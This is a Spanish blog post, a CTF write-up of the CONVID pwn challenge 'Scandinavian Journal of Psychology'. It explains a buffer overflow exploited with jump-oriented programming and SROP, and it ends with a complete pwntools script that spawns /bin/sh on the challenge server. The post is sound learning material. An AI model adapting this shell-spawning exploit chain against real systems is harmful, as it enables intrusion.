<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>WRITEUP. Scandinavian journal of psychology | Your awesome title</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="WRITEUP. Scandinavian journal of psychology" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Vengo con el vuelo del CTF de CONVID que estuvo, pero es que de Lujo! Felicitaciones a los organizadores. El CTF tenía de todo, desafios de Stego, Crypto, Misc, Web, etc. Y sobre todo mi categoría favorita PWN!,&nbsp; soy muy aficionado al exploit dev y sabiendo que algunos desafíos serian hechos por el gran c4e venía con muchas expectativas de lo mismo, por lo que me puse de meta intentar todos los desafíos posibles de la categoría, y estoy muy orgullo del logro, ya que no fue fácil" />
<meta property="og:description" content="Vengo con el vuelo del CTF de CONVID que estuvo, pero es que de Lujo! Felicitaciones a los organizadores. El CTF tenía de todo, desafios de Stego, Crypto, Misc, Web, etc. Y sobre todo mi categoría favorita PWN!,&nbsp; soy muy aficionado al exploit dev y sabiendo que algunos desafíos serian hechos por el gran c4e venía con muchas expectativas de lo mismo, por lo que me puse de meta intentar todos los desafíos posibles de la categoría, y estoy muy orgullo del logro, ya que no fue fácil" />
<link rel="canonical" href="http://localhost:4000/sin%20categor%C3%ADa/2020/06/15/writeup-scandinavian-journal-of-psychology.html" />
<meta property="og:url" content="http://localhost:4000/sin%20categor%C3%ADa/2020/06/15/writeup-scandinavian-journal-of-psychology.html" />
<meta property="og:site_name" content="Your awesome title" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-06-15T00:55:00-04:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="WRITEUP. Scandinavian journal of psychology" />
<script type="application/ld+json">
{"@type":"BlogPosting","url":"http://localhost:4000/sin%20categor%C3%ADa/2020/06/15/writeup-scandinavian-journal-of-psychology.html","headline":"WRITEUP. Scandinavian journal of psychology","dateModified":"2020-06-15T00:55:00-04:00","datePublished":"2020-06-15T00:55:00-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/sin%20categor%C3%ADa/2020/06/15/writeup-scandinavian-journal-of-psychology.html"},"description":"Vengo con el vuelo del CTF de CONVID que estuvo, pero es que de Lujo! Felicitaciones a los organizadores. El CTF tenía de todo, desafios de Stego, Crypto, Misc, Web, etc. Y sobre todo mi categoría favorita PWN!,&nbsp; soy muy aficionado al exploit dev y sabiendo que algunos desafíos serian hechos por el gran c4e venía con muchas expectativas de lo mismo, por lo que me puse de meta intentar todos los desafíos posibles de la categoría, y estoy muy orgullo del logro, ya que no fue fácil","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Your awesome title" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">Your awesome title</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">WRITEUP. Scandinavian journal of psychology</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2020-06-15T00:55:00-04:00" itemprop="datePublished">Jun 15, 2020
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <!-- wp:paragraph -->
<p>Vengo con el vuelo del CTF de <a href="https://convid.cl/">CONVID </a>que estuvo, pero es que de Lujo! Felicitaciones a los organizadores. El CTF tenía de todo, desafios de Stego, Crypto, Misc, Web, etc. Y sobre todo mi categoría favorita PWN!,&nbsp; soy muy aficionado al exploit dev y sabiendo que algunos desafíos serian hechos por el gran <a href="https://c4ebt.github.io/">c4e </a>venía con muchas expectativas de lo mismo, por lo que me puse de meta intentar todos los desafíos posibles de la categoría, y estoy muy orgullo del logro, ya que no fue fácil<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/mEr6R7Atzk0P_eBf-ige4n8nB6ZVKeIy5F_jcIw2cq9sSdpadHely-af-AKnOpfyBd5moNHHftNeSEENWH4O9W7UFB_lsKqdlz168vmslgb3-WDudTscACoqnMBk0Yqn0fTjCVgw" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Hasta el último minuto no tenía equipo, pero mi amigo n0m0 (MVP de nuestro equipo) Se le ocurrió juntar algunos amigos para ver qué podíamos hacer,&nbsp; la verdad la experiencia siempre es grata, es increíble lo que puedes aprender de todos y las ideas que se discuten, así que gracias de nuevo a mi team Jot_Kiddiez (yeah hackers de los 90!). Me voy muy contento con el tercer lugar, además de felicitar los ganadores <a href="https://cntr0llz.com/">Cntr0llz </a>quienes por paliza nuevamente se llevan otro CTF a sus bolsillos.<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/yMTXIku1dBvKegxSs9KsbgEfU2ZUv_zUkCUW8p66_YhbwLbH7it79rfOPwC2NDrkjfk6p5y2-EmzbEfzEZGzUMmDBmxwfFrJWt_Q568rp4KtU_rHQMoOQyEuA4oDxkO_uUe7tSRV" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Yendo a lo nuestro! El reto en cuestión es un reto llamado Scandinavian Joournal of Psychology (Que fumaron?). Es un binario sujeto la ejecución&nbsp; de JOP (jump oriented programming), <a href="/writeup-juujuu-pwnday01-soluciones/">sí de nuevo</a>, pero esta vez las cosas son un poco más difíciles, casi tanto como con el desafío “Labot”, que pueden leer el writeup en el blog de otro crack  <a href="https://f4d3.io/convid-pwn-labot/">f4d3</a>!.&nbsp;<br /></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Revisamos primero el binario para observar que es un ELF de 64 bit dinámicamente linkeado.&nbsp;<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/263hl286PktO4QH05IFePzUUrHFhWnXCJ2gzzAFQRJDYKhCOHplX3pUXlZu27SRsTJPPb5OQZ57yN8EFx3J65s0f-ZKxuTKeQLDIzVwL08f8BEnvnnfgiFuf1mTJXsh0Bk0I6Nmf" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Y podemos usar checksec para ver que tiene protección en el stack solamente (NX), por lo tanto no tendremos que lidiar con aslr</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/h16wTJ5FL9WbzfpDlD6EHAKHbkX_EslW23dCwO2ySlIomi-8njNfWzcNO6gCK44P2C17vXJryGQ_819gqHGpaqMiNLHYbt_3rlgb5iLksJDr6o24yDcaIKn_5t1eBbLmxe5OqxXD" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Cuando analizamos el binario con radare2,, podemos observar que es un binario muy pequeño, sin instrucciones “ret” por lo que deberemos ocupar los saltos a registros para controlar el flujo del stack, luego de darnos cuenta que existe un overflow en la función read<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/tyBnJhaxNmL0k7nk2-kr4cC35H46HRAXFgxPsCYl0SEdJo9oqnfwqymV3ydP5xr7D7Dv6XJAkOzijS7bI7s07jl3JsakmEY3tW9lNinfqc_JUKbq7624t7lERhO_DhOfmUjNgXfu" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Probamos usar cyclic para identificar el crash en gdb<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/mT31CFHSg3zAmz62yTSPSKXKmBvqTRh8faN2Wcf__Gwzv8gs8zRZwfTTPpBm8ybx51orO1gTNJJE0jbz8Yg3vXHeQItQX--wEG0q82iJ4HpBCYjIGc6ttC4duw1kkyRgmm6poJYu" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Y luego calcular el offset al crash en RSP que resulta en 264<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/n_6W1YXvLKTKre-EJK9DPYvTDAMEdGze9-3gx76EF_qBihALhRjKxsBZ7btvpYN0SQM2_CvnEA8NeXyR0sUCwEI9gcbhdOhUUGUPkdO-4Q6vhE2y5CMq6TWrdHoKyx2r93JbEkKf" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:image {"width":422,"height":144} -->
<figure class="wp-block-image is-resized"><img src="https://lh4.googleusercontent.com/NAQ6MQj7xZYoToYBy3lwJiN8uAKJ4sHlOFGTaNwGUHCmCnUZqVQ3fabDwIQnMbajcO2ecul8xkCDhELa_mUw5zkBnSRAXZkjjY9k8crOkftffBrz2dY0CbT96JJVslZ3N6PIAjcN" alt="" width="422" height="144" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Además podemos usar objdump para obtener más información del binario y buscar los gadgets disponibles, resulta interesante que existe una sección .data la cual nos será de utilidad más tarde<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":660,"height":189} -->
<figure class="wp-block-image is-resized"><img src="https://lh5.googleusercontent.com/8S8pi_CvQMYgQZbae4Hp7pEh5OB4ZLZYjBAWq4tBOeQdamPQPXDprzYDwrDjZuV8XaHRQB0g5-lHbmX4dLkPC8uHGmhtXaxF9qJYmc6wxuHplhoNy5VvtWjsl30u1vDSTLLcE4ya" alt="" width="660" height="189" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Y aca los gadgets disponibles (muy pocos!)<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/LITYQjXoxQbixxNrpqONE6rpmAe47i4GHNGtpzqs4MTpO9kqx4ANZxaczxguATeZMTwzfE0EqIt5ZLuK0qBGtat7-P_b18hpxTBSr9NYICxZ2Jo-F6o3vdC8Dakwnlr-O9Dx5GA3" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Qué hacemos ahora pues jop! Como expliqué en otras ocasiones necesitamos setear&nbsp; un dispatcher el cual nos permita retornar al stack y tomar instrucciones de el cada vez que “retornemos” con un salto. El registro a setear parece ser RCX por y nuestro dispatcher es el salto al stack:<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":657,"height":47} -->
<figure class="wp-block-image is-resized"><img src="https://lh3.googleusercontent.com/VItpgQdij6u3CmiCqOehlBK6zZol9TJdpE9iQUEOyANUPZVu5f4HY7x1pqdv-ATjGbtzOb8-2oCZHU9WjkYNbc6QkR5jujLnDGIiQG9ZBamRZYD4p2RReXUSJaPRbnZaiEPreLOA" alt="" width="657" height="47" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Así que comenzamos seteando algunas variables y nuestro payload:<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":480,"height":402} -->
<figure class="wp-block-image is-resized"><img src="https://lh4.googleusercontent.com/LeH4phcdgPkcQQ_2v-XwK8iRI-3tNgm7kle1SeEGHV3FS7aEVEwaBr_EjXT0GtpYuuDVfDa3NbJh99yC1Y6a1YtpqkO1swkY7kMlf8WVnSghA0EXKLNUWuOmrIgmFW70rwR6HKLF" alt="" width="480" height="402" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Bueno con esto ya podemos saber que siempre que ocupemos un gadget que lleve a un salto a RCX vamos a poder retornar a ejecutar la instrucción que se encuentr en el stack, y ahora… Aca es donde uno se cabecea y le da vueltas, no estaba fácil. Luego de muchas pruebas observamos que si llamamos nuevamente a read, el valor de RAX se intercambia con el valor de RDX (el cual contiene el tamaño del buffer donde lee read.<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/iwyUKBLWujtRy5w-dGjLHXs1r95UEriABK17C9wUjMCdC5OV3HHMMqOAtXvGbVb3vpGBXeVBCm2ysE2QQkKY9lWpiHPeUWjIQmZRp8lo7-D-7Zo6mh9B7PCcBCE2jYPpBF02nRg7" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/cjXmcexfZaoXMQExmQnLNaErTwIy95MWR8ZUFgd0iH4PEWPM2rnt4u0WVfVWLah887IPn5Vk4ruo9DqImoCwd-5qULkLaGexpxjZy6kSXEKuuvyobsLEvsLxsHFVzVFY6b9HmHFH" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Genial si sumamos esto al gadget que nos permite aumentar RAX en 7 podemos hacer que el valor de RAX sea 0xF. Que nos permite esto? Pues hacer SROP! O sigreturn oriented programming, que en verdad es una técnica de explotación del tipo “one gadget” ya que nos permite hacer una llamada a sigreturn (que no pide argumentos) y esto nos ayudará a luego crear un “fake frame” lo cual nos permitirá situar los registros a los valores que queramos.<br /></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://lwn.net/Articles/676803/">Mas info de SROP Aca!</a><br /></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Excelente pues llamaremos entonces a sigreturn y seteamos los registros para llamar a execve</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Y dado que llamamos de nuevo read usaremos read para setear los valores de RSI a .data (y escribir /bin/sh para luego usarlo con execve()). Y RDX a 8 para setear luego RAX al mismo valor, nuestro payload queda así (<a href="https://docs.pwntools.com/en/stable/rop/srop.html">gracias pwntools!</a>)<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/0uG6QbXl1yGKIUbQnN3CH0J4NUfk0WSRCud8RZw6iwOY7tRs2eg2FBUYf_A_WIiIUnvRDuJF9utMnudAWydObKGl6DdcmSb764aXSjMTBaVh42dFyyvC-cgwtcF5WkNc7SyUAQO3" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ahora le ponemos bencina a la cosa y ejecutamos, podemos ver la llamada a read para escribir en .data:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":583,"height":130} -->
<figure class="wp-block-image is-resized"><img src="https://lh3.googleusercontent.com/UWLV5sSJr7pNMYjY4trWaoCurFox6xsrv-MTJf8ajs2wqY-Lh1mNMOgI9di9-z592GTH-WA9rHesWVMt9xqtLovi8Jpj2az2mOhbE8Ctst5yEhqCRSSS6Pt_AkSkiKCMHQGvZ4E3" alt="" width="583" height="130" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>y luego sigreturn para setear los registros<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":568,"height":164} -->
<figure class="wp-block-image is-resized"><img src="https://lh6.googleusercontent.com/mdTIBma4otEJsJnXXRuOYAzdqrqVlU70tI9OVjNv36mXgFSgMqZerDA4mAo3qu-jwSDSRrq83NZ8RtPrfdSZzq1Wn-4z4kG9WASKLpRswBJPUDcQ99hUdQ8Yo3UilukwCS2zQpzC" alt="" width="568" height="164" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Y finalmente exceve() con la llamada a /bin/sh<br /></p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":580,"height":121} -->
<figure class="wp-block-image is-resized"><img src="https://lh5.googleusercontent.com/UaAOu2VSnD_FYFnHgYrYHzCXNmtZ3b9nlf3V_4RgaPDqZzeYWJ20hgaOP9QeEHngcT0CtJ9eqfJXJ6M7xoUsNBRetQSrmlI6Y-L185RU7KdUbW3j2SlSNdpS0RH-GGkFRDhpbXKx" alt="" width="580" height="121" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ahora aprobamos remoto y BANG! FLAG DANCE! </p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/KFc40PWR-jb9LykpS7NI6KZrUy3eernjVA0gyGm_368DxHVjDptj9DzsBZfzyb9-gMISC5aByM3nkGZwIvoBlPgTy3oqclLKiymKbQ-8NOOuUk7An9gIhM5EOVieZh_6lbqvwW4u" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Aca les dejo el exploit completo, lo pase genial! Pronto espero compartir mas writeups del CTF, estuvo muy bueno!</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>from pwn import *
from time import sleep

context.clear(arch="amd64")
gdbscript = '''
break *0x00400107
continue
'''
data = 0x600124
dispatcher = 0x00400107
binsh = "/bin/sh\x00"
syscall = 0x400105

payload = (cyclic(256))
payload += p64(0x400115) #pop rcx
payload += p64(dispatcher)#rcx
payload += p64(0x400114)#pop
payload += p64(data)#rsi
payload += p64(0x8)#rdx
payload += p64(0x4000ff)#read
payload += p64(0x400119)
payload += p64(syscall)

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x3b
frame.rdi = data
frame.rsi = 0 
frame.rdx = 0
frame.rip = syscall
payload += str(frame)

#r = gdb.debug('./nanana', gdbscript)
#r = process('./nanana')
r = remote('172.104.234.7', 7891)
r.sendline(payload)
sleep(1)
r.sendline(binsh)# instrucciones?

r.interactive()
</code></pre>
<!-- /wp:code -->

  </div><a class="u-url" href="/sin%20categor%C3%ADa/2020/06/15/writeup-scandinavian-journal-of-psychology.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">Your awesome title</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">Your awesome title</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
